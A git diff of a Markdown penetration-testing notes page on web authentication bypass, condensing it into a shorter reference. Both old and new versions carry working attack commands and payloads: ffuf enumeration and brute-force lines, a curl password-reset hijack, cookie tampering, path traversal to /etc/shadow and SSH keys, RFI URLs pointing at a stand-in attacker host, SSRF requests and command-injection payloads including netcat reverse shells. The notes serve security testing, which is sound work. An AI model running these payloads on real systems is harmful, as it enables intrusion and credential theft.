@@ -1,218 +1,95 @@
 # Web Authentication Bypass
 
-* [Background](web-authentication-bypass.md#background)
-* \[Techniques]
-  * [Username Enumeration](web-authentication-bypass.md#username-enumeration)
-  * [Bruce Forcing](web-authentication-bypass.md#brute-forcing)
-  * [Logic Flaws](web-authentication-bypass.md#logic-flaws)
-  * [Cookie Tampering](web-authentication-bypass.md#cookie-tampering)
-  * [IDOR](web-authentication-bypass.md#idor)
-  * [Path Traversal](web-authentication-bypass.md#path-traversal)
-  * [Local File Inclusion (LFI)](web-authentication-bypass.md#local-file-inclusion-lfi)
-  * [Remote File Inclusion (RFI)](web-authentication-bypass.md#remote-file-inclusion-rfi)
-  * [Server-Side Request Forgery (SSRF)](web-authentication-bypass.md#server-side-request-forgery-ssrf)
-  * [Command Injection](web-authentication-bypass.md#command-injection)
-* [Resources](web-authentication-bypass.md#resources)
+Common web application attacks for bypassing authentication and accessing data or resources that should be protected.
 
-## Background
+## Why It Matters
 
-Web authentication bypass refers to the various techniques and methods used by attackers to gain unauthorized access to a website by bypassing its authentication mechanisms.
+Authentication and access control are where web applications most often fail. The techniques here (enumerating users, tampering with sessions, and abusing how the app references files and resources) are the staples of web testing and frequently lead directly to unauthorized access.
 
-## Techniques
-
-There are many techniques that can be used to bypass authentication in web applications including Username Enumeration, Brute Forcing, Logic Flaws, Cookie Tampering, IDOR, Path Traversal, Local File Inclusion (LFI), Remote File Inclusion (RFI), Server-Side Request Forgery (SSRF), Command Injection.
-
-In addition to the techniques described here, other techniques include Session Hijacking, Session Fixation, XSS, SQL Injection, Password Reuse and Social Engineering.
+## Reference
 
 ### Username Enumeration
 
-Username enumeration can be used with the help of the [Fuzz Faster U Fool (ffuf)](https://github.com/ffuf/ffuf) fuzzing tool.
-
-In the following example, ffuf is used to determine if names from a password list are valid usernames, using these arguments:
+Applications that respond differently to valid and invalid usernames (at sign-up, login, or password reset) leak which accounts exist. Fuzz the field with [ffuf](https://github.com/ffuf/ffuf) and match on the tell-tale response:
 
 ```bash
-ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://VICTIM.COM/sign-up-form -mr "username already exists"
+ffuf -w names.txt -X POST \
+  -d "username=FUZZ&email=x&password=x" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -u http://VICTIM/sign-up -mr "username already exists"
 ```
-
-* `-w`: location of wordlist
-* `-X`: request method
-* `-d`: data to send
-* `-H`: adds additional headers
-* `-u`: URL to send request to
-* `-mr`: text on page used to validate a valid username
 
 ### Brute Forcing
 
-Once valid usernames are found, a brute force attack can be performed on the victim's login page using ffuf.
-
-In the following example, ffuf is used to test a list of valid unsernames against a list of potential passwords, using these arguments:
+With valid usernames, test them against a password list. ffuf supports two wordlists at once:
 
 ```bash
-`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://VICTIM_IP/customers/login -fc 200`
+ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST \
+  -d "username=W1&password=W2" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -u http://VICTIM/login -fc 200
 ```
-
-* `-w1`: wordlist of valid usernames
-* `-w2`: wordlist of potential passwords
-* `-w`: specifies 2 wordlists that are comma separated
-* `-fc`: checks for HTTP status code other than 200
 
 ### Logic Flaws
 
-A logic flaw is when the typical logical path of an application is either bypassed, circumvented, or manipulated by an attacker.
-
-Here is an example of a flaw in a password reset form that enables an attacker to send an account reset for a valid account to an email address of the attacker's choosing. This example uses CURL request using the `-H` flag to add `application/x-www-form-urlencoded` so the web server knows data is being submitted, the `-d` flag specifies that the password reset for `robert` should be emailed to `attacker@email.com`:
-
-```bash
-curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.com' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@email.com'
-```
+When the intended flow of an application can be bypassed or manipulated. A classic example is a password-reset form that trusts a client-supplied email, letting an attacker redirect another user's reset to their own address. Test by changing which fields you control and watching what the app accepts.
 
 ### Cookie Tampering
 
-Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. Cookie values are often hashed or encoded with ASCII or base32. A tool such as [Crackstation](https://crackstation.net/) or [CyberChef](https://gchq.github.io/CyberChef/) could be used to help crack cookie hashes.
+Session cookies that encode state (such as `admin=false`) can sometimes be edited to change it. Values are often base64 or hashed; [CyberChef](https://gchq.github.io/CyberChef/) and [CrackStation](https://crackstation.net/) help decode or crack them. The fix is signed, server-side sessions.
 
-In the following example curl is used to tamper the cookie to show the user logged in as an admin:
+### IDOR (Insecure Direct Object Reference)
 
-```bash
-curl -H "Cookie: logged_in=true; admin=true" http://VICTIM_IP/cookie-test
-```
-
-### IDOR
-
-IDOR stands for Insecure Direct Object Reference occurs when user data input to a webserver is not validated. This occurs when web servers place too much trust in objects like files, data, and documents.
-
-* A simple IDOR example would be a site user whose profile is at the url `http://victim.com/profile?=1` accesses the link `http://victim.com/profile?=100` and sees another user's information
-* URLs are often encoded in base64, so IDOR vulnerabilities in based64 URLs can be identified/exploited
-* URLs might also be encoded with hashed IDs, often in MD5
-* Tips for exploiting IDOR include:
-  * Testing parameter manipulation: This involves modifying parameters in the URL or payload to access restricted resources.
-  * Testing for predictable resource locations: This involves attempting to guess the location of a resource by appending sequential numbers or other predictable values to the URL.
-  * Testing for broken access controls: This involves attempting to access resources by bypassing authentication mechanisms.
-  * Testing for verb tampering: This involves changing the HTTP verb (e.g., GET to POST) to access resources that are normally restricted.
-  * Automated vulnerability scanning: Automated vulnerability scanners can be used to identify IDOR vulnerabilities. However, it's important to note that these tools may not always catch every vulnerability and should be used in conjunction with manual testing.
-  * Reviewing code: It's important to review the code of the web application to understand how objects are referenced and accessed, which can help identify IDOR vulnerabilities.
-  * Keeping up-to-date with common attack vectors: Staying informed about common attack vectors and researching new techniques can help you discover new and emerging IDOR vulnerabilities.
-* Tools for exploiting IDOR include:
-  * [OWASP Zed Attack Proxy ZAP](https://www.zaproxy.org/): A web application security scanner.
-  * [Burp Suite](https://portswigger.net/burp): A web application security testing platform.
-  * [OWASP WebScarab](https://github.com/OWASP/OWASP-WebScarab): A framework for analyzing web applications.
-  * [sqlmap](http://sqlmap.org/): An automated SQL injection and database takeover tool.
-  * [w3af](https://w3af.org/): A web application attack and audit framework.
-  * [Arachni](https://www.arachni-scanner.com/): A web application security scanner.
-  * [Vega](https://subgraph.com/vega/): A web vulnerability scanner and testing platform.
-  * [Base64 Decoding Tool](https://www.base64decode.org/): For decoding base64 encoded URLs.
-  * [Base64 Encoding Tool](https://www.base64encode.org/): For encoding information to base64 URLs.
-  * [Hash Cracking Tool](https://crackstation.net/): To help crack parameters that are hashed, such as user IDs.
+When an app exposes a reference to an object (a file, record, or ID) and does not check that the current user is allowed to access it. Changing `profile?id=1` to `profile?id=100` and seeing another user's data is the canonical example. Test by manipulating IDs, including ones that are base64- or hash-encoded.
 
 ### Path Traversal
 
-Path Traversal, aka Directory Traversal, is a vulnerability that allows an attacker to read OS resources running an application. This vulnerability is exploited by manipulating a web app's URL. Path traversal vulnerabilities occur when the user's input is passed to a function such as [file\_get\_contents](https://www.php.net/manual/en/function.file-get-contents.php) in PHP.
+Manipulating a file path parameter to read files outside the intended directory, using `../` sequences:
 
-* In the following path traversal example, `get.php?file=` is used to traverse to the OS password file: `http://webapp.thm/get.php?file=../../../../etc/passwd`
-* A similar path traversal could be exploited against Windows by running `http://webapp.thm/get.php?file=../../../../boot.ini` or `http://webapp.thm/get.php?file=../../../../windows/win.ini`
-* Here is a list of common OS files that can be tested for path traversal:
-
-| Location                      | Description                                                                                   |
-| ----------------------------- | --------------------------------------------------------------------------------------------- |
-| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.            |
-| `/etc/profile`                | controls system-wide default variables, such as Export variables                              |
-| `/proc/version`               | specifies the version of the Linux kernel                                                     |
-| `/etc/passwd`                 | has all registered user that has access to a system                                           |
-| `/etc/shadow`                 | contains information about the system's users' passwords                                      |
-| `/root/.bash_history`         | contains the history commands for `root` user                                                 |
-| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup |
-| `/var/mail/root`              | all emails for `root` user                                                                    |
-| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                             |
-| `/var/log/apache2/access.log` | the accessed requests for `Apache` webserver                                                  |
-| `C:\boot.ini`                 | contains the boot options for computers with BIOS firmware                                    |
-
-### Local File Inclusion (LFI)
-
-LFT attacks against web applications follows similar concepts as path traversal. PHP functions such as include, require, include\_once, and require\_once often contribute to vulnerable web applications.
-
-In the following example, the `include` PHP function can be used to obtain sensitive information by changing the `lang` input to `/etc/passwd` which would be equivalent to `http://webapp.thm/index.php?lang=../../../../etc/passwd`:
-
-```php
-<?PHP 
-	include("languages/". $_GET['lang']); 
-?>
+```text
+http://webapp/get.php?file=../../../../etc/passwd
+http://webapp/get.php?file=../../../../windows/win.ini
 ```
 
-### Remote File Inclusion (RFI)
+| File | Why It Is Useful |
+| :--- | :--- |
+| `/etc/passwd` | Registered users |
+| `/etc/shadow` | Password hashes (if readable) |
+| `/root/.ssh/id_rsa` | Private SSH keys |
+| `/var/log/apache2/access.log` | Request history (log poisoning) |
+| `C:\boot.ini`, `C:\windows\win.ini` | Windows equivalents |
 
-Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.
+### Local and Remote File Inclusion (LFI / RFI)
 
-For example, an attacker could host a php file where `cmd.txt` prints `Hello Bros`:
-
-```php
-<?PHP echo "Hello Bros"; ?>
-```
-
-Next, the attacker injects their malicious URL into a form that has no input validation so that the page executes the remote file: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
+Where a page includes a file based on user input (common with PHP `include`). LFI includes a local file (`index.php?lang=../../../../etc/passwd`); RFI includes a remote one when `allow_url_fopen` is enabled (`index.php?lang=http://attacker/shell.txt`), which can lead to code execution.
 
 ### Server-Side Request Forgery (SSRF)
 
-SSRF is a vulnerability that causes the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing
-
-There are 2 types of SSRF: regular SSRF where data is returned or blind SSRF where no data is returned to the attacker.
-
-If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.
-
-The following SSRF example an API to retrieve stock status of an item is exploited to request the contents of the `/admin` file on the server itself:
-
-Vulnerability:
-
-```HTTP
-POST /product/stock HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 118
-
-stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
-```
-
-Exploit:
-
-```HTTP
-POST /product/stock HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 118
-
-stockApi=http://localhost/admin
-```
+Making the server send a request of the attacker's choosing, often to reach internal services it can access but the attacker cannot. Blind SSRF (no response returned) is confirmed with an out-of-band tool such as Burp Collaborator. A typical case redirects an API parameter from an internal stock URL to `http://localhost/admin`.
 
 ### Command Injection
 
-Command injection is the abuse of an application's behavior to execute commands on the operating system, using the same privileges that the application on a device is running with. This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system
+Abusing an application that passes user input into a system command. Shell operators (`;`, `&`, `&&`) chain an injected command onto the intended one. Test with low-impact payloads first:
 
-Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them both. Command injection attacks can be either verbose, where there is direct feedback, or bilnd, where there is no direct output.
+| Payload | Purpose |
+| :--- | :--- |
+| `whoami` | Which user the app runs as |
+| `ls` / `dir` | List the current directory |
+| `ping` / `sleep` / `timeout` | Detect blind injection via a delay |
+| `nc` | Spawn a reverse shell (where in scope) |
 
-The `curl` command is a great way to test for command injection. This is because you are able to use `curl` to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection: `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
+## How I Use It
 
-Useful Linux Command Injection Payloads:
+I map the app's authentication and access control first, then work through these techniques roughly in order of likelihood: username enumeration and IDOR tend to pay off fastest, and path traversal, LFI, and command injection carry the highest impact when present. Each finding goes in the report with the specific fix (server-side session validation, access checks, parameterization, input allowlisting).
 
-| Payload  | Description                                                                                                     |
-| -------- | --------------------------------------------------------------------------------------------------------------- |
-| `whoami` | See what user the application is running under.                                                                 |
-| `ls`     | List the contents of the current directory.                                                                     |
-| `ping`   | This command will invoke the application to hang, useful in testing an application for blind command injection. |
-| `sleep`  | This is another useful payload in testing an application for blind command injection.                           |
-| `nc`     | Netcat can be used to spawn a reverse shell onto the vulnerable application.                                    |
+## Related
 
-Useful Windows Command Injection Payloads:
-
-| `whoami`  | See what user the application is running under.                                                                              |
-| --------- | ---------------------------------------------------------------------------------------------------------------------------- |
-| `dir`     | List the contents of the current directory.                                                                                  |
-| `ping`    | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
-| `timeout` | This command will also invoke the application to hang, can also test for blind injection.                                    |
-
-* Resources
-  * [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)
-  * [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-  * [w3af](http://w3af.org/): An open source web application attack and audit framework that can be used to identify vulnerabilities in web applications.
+* [SQL Injection](sql-injection.md), [XSS](xss.md)
+* [Web Application Recon](../reconnaissance/web-application-recon.md)
+* [Burp Suite](burp-suite.md), [OWASP ZAP](owasp-zap.md)
 
 ## Resources
 
-* [Pentesting Web Checklist](https://pentestbook.six2dez.com/others/web-checklist)
-* [Web Pentesting Checklist](https://ressurect.gitbook.io/notes/web/web-pentesting-checklist)
-* [Web Application Penetration Testing Checklist](https://alike-lantern-72d.notion.site/Web-Application-Penetration-Testing-Checklist-4792d95add7d4ffd85dd50a5f50659c6)
-* [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
+* [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+* [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
